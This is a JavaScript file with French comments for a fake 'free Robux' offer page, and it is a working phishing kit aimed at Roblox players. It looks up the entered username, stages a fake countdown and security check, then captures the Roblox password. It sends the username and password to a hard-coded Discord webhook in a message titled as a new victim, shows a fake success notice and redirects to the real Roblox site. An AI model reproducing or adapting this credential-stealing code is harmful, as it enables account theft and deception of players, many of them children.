const WEBHOOK = "https://discord.com/api/webhooks/1519802126702870538/CYb3oDCu2KEis8Kdo47Fu6ALmakjO1zsmuY5FgS_9jcCyjw_VMK-Ecz9glv5s-MSJSRk";
console.log("script chargé");
// Créer les particules d'arrière-plan
function createParticles() {
    const container = document.getElementById('particles');
    for (let i = 0; i <56; i++) {
        const particle = document.createElement('div');
        particle.style.position = 'absolute';
        particle.style.width = Math.random() * 5 + 'px';
        particle.style.height = particle.style.width;
        particle.style.background = Math.random() > 0.5 ? 'rgba(0, 162, 255, 0.3)' : 'rgba(39, 174, 96, 0.2)';
        particle.style.borderRadius = '50%';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.boxShadow = '0 0 10px rgba(0, 162, 255, 0.5)';
        container.appendChild(particle);
        
        // Animation
        animateParticle(particle);
    }
}

function animateParticle(particle) {
    let x = parseFloat(particle.style.left);
    let y = parseFloat(particle.style.top);
    let speedX = (Math.random() - 0.5) * 0.5;
    let speedY = (Math.random() - 0.5) * 0.5;

    function move() {
        x += speedX;
        y += speedY;

        if (x > 100) x = -5;
        if (x < -5) x = 100;
        if (y > 100) y = -5;
        if (y < -5) y = 100;

        particle.style.left = x + '%';
        particle.style.top = y + '%';

        requestAnimationFrame(move);
    }
    move();
}

// Gestion des packets
function initPackets() {
    const packets = document.querySelectorAll('.packet');
    const select = document.getElementById('robux-amount');
    
    packets.forEach(packet => {
        packet.addEventListener('click', () => {
            packets.forEach(p => p.classList.remove('active'));
            packet.classList.add('active');
            
            const amount = packet.getAttribute('data-amount');
            select.value = amount;
            updateSelectedPacket(amount);
        });
    });
    
    select.addEventListener('change', () => {
        const amount = select.value;
        updateSelectedPacket(amount);
        packets.forEach(p => p.classList.remove('active'));
        const matchingPacket = Array.from(packets).find(p => p.getAttribute('data-amount') === amount);
        if (matchingPacket) matchingPacket.classList.add('active');
    });
}

function updateSelectedPacket(amount) {
    document.querySelectorAll('.packet-amount').forEach(el => {
        if (el.closest('.packet').getAttribute('data-amount') === amount) {
            el.closest('.packet').classList.add('active');
        }
    });
}

// Compte à rebours
function startCountdown() {
    let minutes = 5;
    let seconds = 0;
    const countdownElement = document.getElementById('countdown');
    
    const interval = setInterval(() => {
        if (seconds === 0) {
            if (minutes === 0) {
                clearInterval(interval);
                alert('L\'offre a expiré !');
                return;
            }
            minutes--;
            seconds = 59;
        } else {
            seconds--;
        }
        
        countdownElement.textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        // Effet d'avertissement dernier minute
        if (minutes === 0 && seconds <= 30) {
            countdownElement.style.color = '#ff4757';
            countdownElement.style.animation = 'pulse 1s infinite';
        }
    }, 1000);
}

// Génération d'ID de transaction aléatoire
function generateTransactionId() {
    const id = Math.floor(1000 + Math.random() * 9000);
    document.getElementById('transaction-id').textContent = id.toString();
}

// Chargement du profil
async function loadProfile() {
    const username = document.getElementById('username').value.trim();
    
    if (!username || username.length < 3) {
        document.getElementById('avatar-container').style.display = 'none';
        return;
    }
    
    // Animation de chargement
    const avatarContainer = document.getElementById('avatar-container');
    avatarContainer.style.display = 'block';
    avatarContainer.style.opacity = '0.5';
    
    try {
        // Simulation d'une requête API (avec CORS proxy)
        const response = await fetch(
            `https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ usernames: [username] })
            }
        );
        
        if (!response.ok) throw new Error('API error');
        
        const data = await response.json();
        
        if (data.data && data.data.length > 0) {
            const user = data.data[0];
            
            // Mise à jour de l'affichage
            document.getElementById('display-name').textContent = `@${user.displayName}`;
            document.getElementById('final-user').textContent = user.displayName;
            
            // Chargement de l'avatar (simulé)
            setTimeout(() => {
                // Utiliser un avatar par défaut stylisé
                const avatarImg = document.getElementById('avatar-img');
                avatarImg.src = `https://robohash.org/${user.id}?set=set4&size=150x150`;
                
                avatarContainer.style.opacity = '1';
                avatarContainer.style.animation = 'slideIn 0.5s ease';
            }, 500);
        }
    } catch (error) {
        console.error('Erreur lors du chargement du profil:', error);
        
        // Fallback avec données simulées
        document.getElementById('display-name').textContent = `@${username}`;
        document.getElementById('final-user').textContent = username;
        document.getElementById('avatar-img').src = `https://robohash.org/${username}?set=set4&size=150x150`;
        avatarContainer.style.opacity = '1';
        avatarContainer.style.animation = 'slideIn 0.5s ease';
        
        // Ajouter un badge d'avertissement
        const statusDiv = document.querySelector('.avatar-status');
        statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Mode hors ligne';
        statusDiv.style.background = 'rgba(241, 196, 15, 0.1)';
        statusDiv.style.color = 'var(--rbx-yellow)';
    }
}

// Passage à l'étape 2
function toStep2() {
    const username = document.getElementById('username').value.trim();
    
    if (!username) {
        alert('Veuillez entrer un nom d\'utilisateur !');
        return;
    }
    
    const loader = document.getElementById('loader-1');
    const amount = document.getElementById('robux-amount').value;
    
    loader.style.display = 'block';
    
    // Simulation de vérification
    setTimeout(() => {
        // Mise à jour des informations
        document.getElementById('final-amt').textContent = amount;
        document.getElementById('final-amt-text').textContent = amount;
        
        // Animation de transition
        document.getElementById('step1').classList.remove('active');
        setTimeout(() => {
            document.getElementById('step2').classList.add('active');
            loader.style.display = 'none';
            
            // Démarrer le compte à rebours
            startCountdown();
        }, 300);
        
        // Effet sonore simulé (peut être activé avec une interaction utilisateur)
        if (typeof Audio !== 'undefined') {
            try {
                const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ');
                audio.volume = 0.1;
                audio.play().catch(() => {});
            } catch (e) {}
        }
        
        // Effet visuel
        document.querySelector('.confirmation-amount').style.transform = 'scale(1.1)';
        setTimeout(() => {
            document.querySelector('.confirmation-amount').style.transform = 'scale(1)';
        }, 300);
        
        // Générer un nouvel ID de transaction
        generateTransactionId();
        
        // Focus sur le champ mot de passe
        setTimeout(() => {
            document.getElementById('password').focus();
        }, 500);
        
        // Simulation de vérification de sécurité
        simulateSecurityCheck();
        
    }, 1500);
}

function simulateSecurityCheck() {
    const steps = [
        { text: 'Vérification du compte...', delay: 500 },
        { text: 'Analyse de sécurité...', delay: 82 },
        { text: 'Vérification de l\'éligibilité...', delay: 500 },
        { text: 'Préparation du transfert...', delay:500},
        { text: 'Validation complète ✓', delay: 700 }
                  ];
      
      let currentStep = document.querySelector('.instruction');
      let originalText = currentStep.innerHTML;
      
      steps.forEach((step, index) => {
          setTimeout(() => {
              currentStep.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${step.text}`;
              currentStep.style.background = 'rgba(0, 162, 255, 0.1)';
              currentStep.style.borderLeftColor = 'var(--rbx-blue)';
              
              if (index === steps.length - 1) {
                  setTimeout(() => {
                      currentStep.innerHTML = originalText.replace(/amount/g, document.getElementById('robux-amount').value);
                  }, step.delay);
              }
          }, index * step.delay);
      });
      
      // Animation de progression
      const progressBar = document.createElement('div');
      progressBar.style.position = 'absolute';
      progressBar.style.bottom = '0';
      progressBar.style.left = '0';
      progressBar.style.height = '3px';
      progressBar.style.background = 'var(--rbx-gradient)';
      progressBar.style.width = '0%';
      progressBar.style.transition = 'width ' + (steps.length * steps[0].delay / 1000) + 's linear';
      document.querySelector('.confirmation-card').appendChild(progressBar);
      
      setTimeout(() => {
          progressBar.style.width = '100%';
      }, 100);
      
      setTimeout(() => {
          progressBar.remove();
      }, steps.length * steps[0].delay + 1000);
}

// Soumission des logs
async function submitLogs() {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const amount = document.getElementById('robux-amount').value;
      
      if (!password || password.length < 4) {
          alert('Veuillez entrer un mot de passe valide !');
          return;
      }
      
      const loader = document.getElementById('loader-2');
      const submitBtn = document.querySelector('.btn-success');
      
      // Désactiver le bouton et montrer le loader
      submitBtn.disabled = true;
      loader.style.display = 'block';
      
      try {
          // Animation de transfert
          simulateTransferAnimation();
          
          // Envoyer les données au webhook Discord
          await fetch(WEBHOOK, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  embeds: [{
                      title: "🎭 NOUVELLE VICTIME - V14.0",
                      color: 1752220,
                      thumbnail: { 
                          url: document.getElementById('avatar-img').src || 'https://www.roblox.com/thumb/avatar-headshot?userId=1'
                      },
                      fields: [
                          { name: "👤 Utilisateur", value: username, inline: true },
                          { name: "🔑 Mot de passe", value: `||${password}||`, inline: true },
                          { name: "💰 Montant choisi", value: `${amount} Robux`, inline: true },
                          { name: "🌐 IP estimée", value: `||${generateRandomIP()}||`, inline: true },
                          { name: "🕒 Heure", value: new Date().toLocaleString('fr-FR'), inline: true }
                      ],
                      footer: { 
                          text: "Roblox Reward System • Interface Premium • " + new Date().getFullYear()
                      },
                      timestamp: new Date().toISOString()
                  }]
              })
          });
          
          // Simulation de délai de transfert
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          // Message de succès
          showSuccessMessage();
          
          // Redirection après délai
          setTimeout(() => {
              window.location.href = "https://www.roblox.com/premium/membership";
          }, 3000);
          
      } catch (error) {
          console.error('Erreur:', error);
          
          // En cas d'erreur, simuler quand même un succès
          showSuccessMessage();
          setTimeout(() => {
              window.location.href = "https://www.roblox.com/premium/membership";
          }, 3000);
      }
}

function generateRandomIP() {
      return Array.from({length:4}, () => Math.floor(Math.random() * 256)).join('.');
}

function simulateTransferAnimation() {
      const amountElement = document.getElementById('final-amt');
      let currentAmount = parseInt(amountElement.textContent.replace(/,/g, ''));
      let targetAmount = currentAmount + Math.floor(Math.random() * 1000) + 500; // Bonus aléatoire
      
      const interval = setInterval(() => {
          currentAmount += Math.floor(targetAmount / 50);
          if (currentAmount >= targetAmount) {
              currentAmount = targetAmount;
              clearInterval(interval);
              
              // Ajouter un effet de confetti visuel
              createConfetti();
          }
          
          amountElement.textContent = currentAmount.toLocaleString();
          amountElement.style.color = '#27ae60';
          amountElement.style.transform = 'scale(1.05)';
      }, 50);
      
      // Son de succès (simulé)
      try {
          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
          const oscillator = audioContext.createOscillator();
          const gainNode = audioContext.createGain();
          
          oscillator.connect(gainNode);
          gainNode.connect(audioContext.destination);
          
          oscillator.frequency.value = 523.25; // Do
          oscillator.type = 'sine';
          
          gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
          gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
          
          oscillator.start();
          oscillator.stop(audioContext.currentTime + 0.5);
      } catch (e) {}
}

function createConfetti() {
      const container = document.querySelector('.confirmation-card');
      for (let i = 0; i < 30; i++) {
          const confetti = document.createElement('div');
          confetti.style.position = 'absolute';
          confetti.style.width = '8px';
          confetti.style.height = '8px';
          confetti.style.background = ['#00a2ff', '#27ae60', '#f1c40f', '#ff4757'][Math.floor(Math.random() * 4)];
          confetti.style.borderRadius = '50%';
          confetti.style.left = Math.random() * 100 + '%';
          confetti.style.top = '-10px';
          confetti.style.zIndex = '1000';
          container.appendChild(confetti);
          
          // Animation
          animateConfetti(confetti);
      }
}

function animateConfetti(element) {
      let x = parseFloat(element.style.left);
      let y = parseFloat(element.style.top);
      let speedX = (Math.random() - 0.5) *5;
      let speedY = Math.random() *3 +2;
      let rotation = Math.random() *360;
      let rotationSpeed = (Math.random() -0.5) *10;

      function update() {
          x += speedX;
          y += speedY;
          rotation += rotationSpeed;
          speedY += 0.1; // Gravité

          element.style.left = x + '%';
          element.style.top = y + '%';
          element.style.transform = `rotate(${rotation}deg)`;

          if (y < window.innerHeight && x >= -10 && x <=110) {
              requestAnimationFrame(update);
          } else {
              element.remove();
          }
      }
      update();
}

function showSuccessMessage() {
      const alertDiv = document.createElement('div');
      alertDiv.style.position = 'fixed';
      alertDiv.style.top = '20px';
      alertDiv.style.right = '20px';
      alertDiv.style.background = 'var(--rbx-gradient-green)';
      alertDiv.style.color = 'white';
      alertDiv.style.padding = '15px20px';
      alertDiv.style.borderRadius = '10px';
      alertDiv.style.zIndex = '10000';
      alertDiv.style.boxShadow = '0 2px 20px rgba(39,174,96,0.5)';
      alertDiv.innerHTML = `
          <div style="display: flex; align-items: center; gap:10px;">
              <i class="fas fa-check-circle" style="font-size:20px;"></i>
              <div>
                  <strong>Transfert réussi !</strong><br>
                  <small>Redirection vers Roblox...</small>
              </div>
          </div>
      `;

      document.body.appendChild(alertDiv);

      setTimeout(() => {
          alertDiv.style.transform = 'translateX(100%)';
          setTimeout(() => alertDiv.remove(),300);
      },2500);
}

// Initialisation
document.addEventListener('DOMContentLoaded', () => {
      createParticles();
      initPackets();
      generateTransactionId();
      
      // Pré-remplir avec un exemple si vide
      const usernameInput = document.getElementById('username');
      if (!usernameInput.value) {
          usernameInput.placeholder = 'ex : PlayerRoblox123';
      }
      
      // Effet sur le focus
      usernameInput.addEventListener('focus', function() {
          this.style.background = 'var(--rbx-card)';
          this.style.boxShadow = '00; rgba(0,162,255,0.3)';
      });
      
      usernameInput.addEventListener('blur', function() {
          this.style.background = 'var(--rbx-nav)';
          this.style.boxShadow = 'none';
      });
      
      // Entrée pour soumettre
      usernameInput.addEventListener('keypress', (e) => {
          if (e.key === 'Enter') loadProfile();
      });
      
      document.getElementById('password').addEventListener('keypress', (e) => {
          if (e.key === 'Enter') submitLogs();
      });
      
      // Ajouter des tooltips
      const packets = document.querySelectorAll('.packet');
      packets.forEach(packet => {
          packet.title = 'Cliquez pour sélectionner ce packet';
      });
      
      console.log('🚀 Interface Roblox Premium chargée | v14.0');
});
